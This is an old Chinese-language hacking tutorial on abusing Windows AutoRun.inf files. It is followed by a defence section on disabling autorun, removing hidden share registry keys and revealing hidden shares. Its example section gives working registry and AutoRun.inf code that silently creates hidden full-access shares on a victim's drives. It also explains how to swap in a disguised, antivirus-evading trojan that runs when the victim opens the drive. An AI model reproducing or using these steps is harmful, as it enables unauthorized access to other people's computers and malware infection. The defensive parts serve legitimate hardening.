@@ -1,0 +1,152 @@
+最近网上流行通过AutoRun.inf文件使对方所有的硬盘完全共享或中木马的方法，由于AutoRun.inf文件在黑客技术中的应用还是很少见的，相应的资料也不多，有很多人对此觉得很神秘，本文试图为您解开这个迷，使您能完全的了解这个并不复杂却极其有趣的技术。 
+
+一、理论基础 
+
+经常使用光盘的朋友都知道，有很多光盘放入光驱就会自动运行，它们是怎么做的呢？光盘一放入光驱就会自动被执行，主要依靠两个文件，一是光盘上的AutoRun.inf文件，另一个是操作系统本身的系统文件之一的Cdvsd.vxd。Cdvsd.vxd会随时侦测光驱中是否有放入光盘的动作，如果有的话，便开始寻找光盘根目录下的AutoRun.inf文件。如果存在AutoRun.inf文件则执行它里面的预设程序。 
+
+AutoRun.inf不光能让光盘自动运行程序，也能让硬盘自动运行程序，方法很简单，先打开记事本，然后用鼠标右键点击该文件，在弹出菜单中选择“重命名”，将其改名为AutoRun.inf，在AutoRun.inf中键入以下内容： 
+
+
+[AutoRun]　　　　//表示AutoRun部分开始，必须输入
+
+Icon=C:\C.ico　　//给C盘一个个性化的盘符图标C.ico
+
+Open=C:\1.exe　　//指定要运行程序的路径和名称，在此为C盘下的1.exe
+
+
+保存该文件，按F5刷新桌面，再看“我的电脑”中的该盘符(在此为C盘)，你会发现它的磁盘图标变了，双击进入C盘，还会自动播放C盘下的1.exe文件！ 
+
+解释一下：“[AutoRun]”行是必须的固定格式，“Icon”行对应的是图标文件，“C:\C.ico”为图标文件路径和文件名，你在输入时可以将它改为你的图片文件所在路径和文件名。另外，“.ico”为图标文件的扩展名，如果你手头上没有这类文件，可以用看图软件ACDSee将其他格式的软件转换为ico格式，或者找到一个后缀名为BMP的文件，将它直接改名为ICO文件即可。 
+
+“Open”行指定要自动运行的文件及其盘符和路径。要特别说明的是，如果你要改变的硬盘跟目录下没有自动播放文件，就应该把“OPEN”行删掉，否则就会因为找不到自动播放文件而打不开硬盘，此时只能用鼠标右键单击盘符在弹出菜单中选“打开”才行。 
+
+请大家注意：保存的文件名必须是“AutoRun.inf”，编制好的Autorun.inf文件和图标文件一定要放在硬盘根目录下。更进一步，如果你的某个硬盘内容暂时比较固定的话，不妨用Flash做一个自动播放文件，再编上“Autorun”文件，那你就有最酷、最个性的硬盘了。 
+
+到这儿还没有完。大家知道，在一些光盘放入后，我们在其图标上单击鼠标右键，还会产生一个具有特色的目录菜单，如果能对着我们的硬盘点击鼠标右键也产生这样的效果，那将更加的有特色。其实，光盘能有这样的效果也仅仅是因为在AutoRun.inf文件中有如下两条语句： 
+
+
+shell\标志＝显示的鼠标右键菜单中内容
+
+shell\标志\command＝要执行的文件或命令行
+
+
+所以，要让硬盘具有特色的目录菜单，在AutoRun.inf文件中加入上述语句即可，示例如下： 
+
+
+shell\1=天若有情天亦老
+
+shell\1\command\=notepad ok.txt
+
+
+保存完毕，按F5键刷新，然后用鼠标右键单击硬盘图标，在弹出菜单中会发现“天若有情天亦老”，点击它，会自动打开硬盘中的“ok.txt”文件。注意：上面示例假设“ok.txt”文件在硬盘根目录下，notepad为系统自带的记事本程序。如果要执行的文件为直接可执行程序，则在“command\”后直接添加该执行程序文件名即可。 
+
+二、实例 
+
+下面就举个例子：如果你扫到一台开着139共享的机器，而对方只完全共享了D盘，我们要让对方的所有驱动器都共享。首先编辑一个注册表文件，打开记事本，键入以下内容： 
+
+
+REGEDIT4
+'此处一定要空一行
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\C$]
+"Path"="C:"
+"Remark"=""
+"Type"=dword:00000000
+"Flags"=dword:00000302
+"Parmlenc"=hex:
+"Parm2enc"=hex:
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\D$]
+"Path"="D:"
+"Remark"=""
+"Type"=dword:00000000
+"Flags"=dword:00000302
+"Parmlenc"=hex:
+"Parm2enc"=hex:
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\C$]
+"Path"="E:"
+"Remark"=""
+"Type"=dword:00000000
+"Flags"=dword:00000302
+"Parmlenc"=hex:
+"Parm2enc"=hex:
+
+
+以上我只设置到E盘，如果对方有很多逻辑盘符的请自行设置。将以上部分另存为Share.reg文件备用。要特别注意REGEDIT4为大写且顶格书写，其后要空上一行，在最后一行记得要按一次回车键。 
+
+然后打开记事本，编制一个AutoRun.inf文件，键入以下内容： 
+
+
+[AutoRun]
+Open=regedit/s Share.reg //加/s参数是为了导入时不会显示任何信息
+
+
+保存AutoRun.inf文件。将Share.reg和AutoRun.inf这两个文件都复制到对方的D盘的根目录下，这样对方只要双击D盘就会将Share.reg导入注册表，这样对方电脑重启后所有驱动器就会都完全共享出来。 
+
+如果想让对方中木马，只要在AutoRun.inf文件中，把“Open=Share.Reg”改成“Open=木马服务端文件名”，然后把AutoRun.inf和配置好的木马服务端一起复制到对方D盘的根目录下，这样不需对方运行木马服务端程序，而只需他双击D盘就会使木马运行！这样做的好处显而易见，那就是大大的增加了木马运行的主动性！须知许多人现在都是非常警惕的，不熟悉的文件他们轻易的不会运行，而这种方法就很难防范了。 
+
+要说明的是，给你下木马的人不会那么蠢的不给木马加以伪装，一般说来，他们会给木马服务端文件改个名字，或好听或和系统文件名很相像，然后给木马换个图标，使它看起来像TXT文件、ZIP文件或图片文件等，，最后修改木马的资源文件使其不被杀毒软件识别（具体的方法可以看本刊以前的文章），当服务端用户信以为真时，木马却悄悄侵入了系统。其实，换个角度理解就不难了——要是您给别人下木马我想你也会这样做的。以上手段再辅以如上内容的AutoRun.inf文件就天衣无缝了！ 
+
+三、防范方法 
+
+共享分类完全是由flags标志决定的，它的键值决定了共享目录的类型。当flags=0x302时，重新启动系统，目录共享标志消失，表面上看没有共享，实际上该目录正处于完全共享状态。网上流行的共享蠕虫，就是利用了此特性。如果把"Flags"=dword:00000302改成"Flags"=dword:00000402，就可以看到硬盘被共享了，明白了吗？秘密就在这里！ 
+
+以上代码中的Parmlenc、Parm2enc属性项是加密的密码，系统在加密时采用了8位密码分别与“35 9a 4b a6 53 a9 d4 6a”进行异或运算，要想求出密码再进行一次异或运算，然后查ASCII表可得出目录密码。在网络软件中有一款软件就利用该属性进行网络密码破解的，在局域网内从一台机器上可以看到另一台计算机的共享密码。 
+
+利用TCP/IP协议设计的NethackerⅡ软件可以穿过Internet网络，找到共享的主机，然后进行相应操作。所以当您通过Modem上网时，千万要小心，因为一不小心，您的主机将完全共享给对方了。 
+
+解决办法是把 
+
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan
+
+
+
+下面的“C$”、“D$”、“E$”等删掉。然后删除windows\system\下面的Vserver.vxd删除，它是Microsoft网络上的文件与打印机共享虚拟设备驱动程序，再把 
+
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\
+
+
+
+下的Vserver键值删掉，就会很安全了。 
+另外，关闭硬盘AutoRun功能也是防范黑客入侵的有效方法之一。具体方法是在“开始”菜单的“运行”中输入Regedit，打开注册表编辑器，展开到 
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Exploer
+
+
+
+主键下，在右侧窗格中找到“NoDriveTypeAutoRun”，就是这个键决定了是否执行CDROM或硬盘的AutoRun功能。 
+双击“NoDriveTypeAutoRun”，在默认状态下（即你没有禁止过AutoRun功能），在弹出窗口中可以看到“NoDriveTypeAutoRun”默认键值为95,00,00,00。其中第一个值“95”是十六进制值，它是所有被禁止自动运行设备的和。将“95”转为二进制就是10010101，其中每位代表一个设备，Windows中不同设备会用如下数值表示： 
+
+
+设备名称　　　　 第几位 值 设备用如下数值表示 设备名称含义
+DKIVE_UNKNOWN　　 0　　1　　01h　　　　　　 不能识别的设备类型
+DRIVE_NO_ROOT_DIR 1　　0　　02h　　　　　　 没有根目录的驱动器(Drive without root 　
+　　　　　　　　　　　　　　　　　　　　　　　 directory) 
+DRIVE_REMOVABLE　　2　　1　　04h　　　　　　 可移 动驱动器(Removable drive)
+DRIVE_FIXED　　　　3　　0　　08h　　　　　　 固定的驱动器(Fixed drive) 
+DRIVE_REMOTE　　 4　　1　　10h　　　　　　 网络驱动器(Network drive)
+DRIVE_CDROM　　　　5　　0　　20h　　　　　　 光驱(CD-ROM)　　
+DRIVE_RAMDISK　　 6　　0　　40h　　　　　　 RAM磁盘(RAM Disk) 
+保留　　　　　　 7　　1　　80h　　　　　　 未指定的驱动器类型(Not yet 
+specified drive disk)
+
+
+在上面所列的表中值为“0”表示设备运行，值为“1”表示该设备不运行（默认情况下，Windows禁止80h、10h、4h、01h这些设备自动运行，这些数值累加正好是十六进制的95h，所以NoDriveTypeAutoRun”默认键值为95,00,00,00）。 
+
+由上面的分析不难看出，在默认情况下，会自动运行的设备是DRIVE_NO_ROOT_DIR、DRIVE_FIXED、DRIVE_CDROM、DRIVE_RAMDISK这四个保留设备，所以要禁止硬盘自动运行AutoRun.inf文件，就必须将DRIVE_FIXED的值设为1，这是因为DRIVE_FIXED代表固定的驱动器，即硬盘。这样一来，原来的10010101（在表中“值”列中由下向上看）就变成了二进制的10011101，转为十六进制为9D。现在，将“NoDriveTypeAutoRun”的键值改为9D,00,00,00后关闭注册表编辑器，重启电脑后就会关闭硬盘的AutoRun功能。 
+
+如果你看明白了，那你肯定知道该怎样禁止光盘AutoRun功能了，对！就是将DRIVE_CDROM设为1，这样“NoDriveTypeAutoRun”键值中的第一个值就变成了10110101，也就是十六进制的B5。将第一个值改为B5后关闭注册表编辑器，重启电脑后就会关闭CDROM的Autorun功能。如果仅想禁止软件光盘的AutoRun功能，但又保留对CD音频碟的自动播放能力，这时只需将“NoDriveTypeAutoRun”的键值改为：BD,00,00,00即可。 
+
+如果想要恢复硬盘或光驱的AutoRun功能，进行反方向操作即可。 
+
+事实上，大多数的硬盘根目录下并不需要AutoRun.inf文件来运行程序，因此我们完全可以将硬盘的AutoRun功能关闭，这样即使在硬盘根目录下有AutoRun.inf这个文件，Windows也不会去运行其中指定的程序，从而可以达到防止黑客利用AutoRun.inf文件入侵的目的。 
+
+除此以外，我们还应让Windows能显示出隐藏的共享。大家都知道，在Windows 9X中设置共享时，通过在共享名后加上“$”这个符号，可使共享隐藏。比如，我们给一个名为share的计算机的C盘设置共享时，只要将其共享名设为C$。这样我们将看不到被共享的C盘，只有通过输入该共享的确切路径，才能访问此共享。不过我们只要用将电脑中的msnp32.dll文件稍做修改。就可以让Windows显示出隐藏的共享。 
+
+由于在Windows下msnp32.dll会被调用，不能直接修改此文件，所以第一步我们要复制msnp32.dll到C盘下并改名为msnp32，msnp32.dll在C:\Windows\system文件夹下。运行UltraEdit等十六进制文件编辑器打开msnp32，找到“24 56 E8 17”（位于偏移地址00003190～000031A0处），找到后将“24”改为“00”，然后保存，关闭UltraEdit。重启计算机进入DOS模式，在命令提示符下输入copy c:\msnp32.dll c:\Windows\system\msnp32.dll，重启进入Windows，现在双击share就能看见被隐藏的共享了。 
+
+最后要提醒大家利用TCP/IP协议设计的NethackerⅡ等黑客软件可以穿过Internet网络，找到共享的主机，然后进行相应操作。所以当您通过Modem上网时，千万要小心，因为一不小心，您的主机将完全共享给对方了。防范这类事情发生的方法无非是经常检查系统，给系统打上补丁，经常使用反黑杀毒软件，上网时打开防火墙，注意异常现象，留意AutoRun.inf文件的内容，关闭共享或不要设置为完全共享，且加上复杂的共享密码。 
+
+声明：本文的目的是使大家能清楚地了解网上流行的黑客手段，增强自己的防护意识，因此请大家不要用本文的方法去干违法的事情，切记：己所不欲，勿施于人！
